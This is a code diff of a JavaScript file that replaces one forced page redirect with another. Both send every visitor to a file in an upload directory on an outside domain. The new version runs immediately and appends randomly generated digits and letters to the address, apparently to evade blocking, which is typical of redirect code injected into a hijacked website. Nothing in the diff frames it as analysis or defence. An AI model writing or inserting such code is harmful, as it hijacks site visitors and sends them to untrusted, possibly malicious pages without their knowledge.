@@ -6,12 +6,20 @@ function leleua() {
     }
 }
 
-leleua();
-
-window.onload = function () {
-    const targetUrl = 'http://www.360tianma.com/public/upload/conf/2024/01-11/38db6050a87abdd15393b354437fedc5.HTM#&#<-_-=>.cn,:http://ftp://.,]ed.https://qq.cn.comu:/.com#';
-    const timestamp = Date.now();
-    const randomString = Math.random().toString(36).substring(2);
-    const urlWithParam = `${targetUrl}${timestamp}${randomString}`;
-    window.location.href = urlWithParam
+var urls=[
+'http://www.360tianma.com/public/upload/conf/2024/01-11/38db6050a87abdd15393b354437fedc5.HTM?{NNNNNNNnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnn}{wwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwnwnwnnnwnnnnnnwwwwwwwwwwwwwwwwwww}',
+];
+location.href = myEeplace(urls[Math.floor(Math.random()*urls.length)]);
+function myEeplace(s){
+	return s.replace(/\{(\w+?)\}/g,function(a,b){
+		var h='';
+		for(var i=0;i<b.length;i++){
+			if('n'==b[i]){
+				h+=Math.floor(Math.random()*10);
+			}else if('w'==b[i]){
+				h+=String.fromCharCode(97+Math.floor(Math.random()*26));
+			}
+		}
+		return h;
+	});
 }
